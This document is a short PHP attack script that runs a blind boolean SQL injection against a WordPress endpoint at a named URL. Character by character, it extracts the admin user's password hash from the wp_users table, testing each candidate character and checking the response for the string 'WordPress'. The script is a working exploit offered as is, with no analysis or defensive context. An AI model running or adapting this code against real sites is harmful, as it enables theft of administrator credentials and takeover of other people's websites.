<?php

$url = "https://bitslip6.com/webarx.php?post=1";

$dictionary = array(
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
    'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '/', '.');
define('MAX_CHAR', count($dictionary));

function get_str(int $pos, string $chr) {
$inj = " and -- lolz
binary substr((select user_pass from wp_users where id=1), $pos, 1) = '$chr'";
return urlencode($inj);
}
$password = "";
for ($i=4; $i<35; $i++) {
    for ($chr=0; $chr<MAX_CHAR; $chr++) {
        $test = "{$url}".get_str($i, $dictionary[$chr]);
        $r = file_get_contents($test);
        echo chr(8) . $dictionary[$chr];
        if (strpos($r, "WordPress") > 0) {
            $password .= $dictionary[$chr];
            echo "[$password] ($chr)\n";
            break;
        }
    }
}

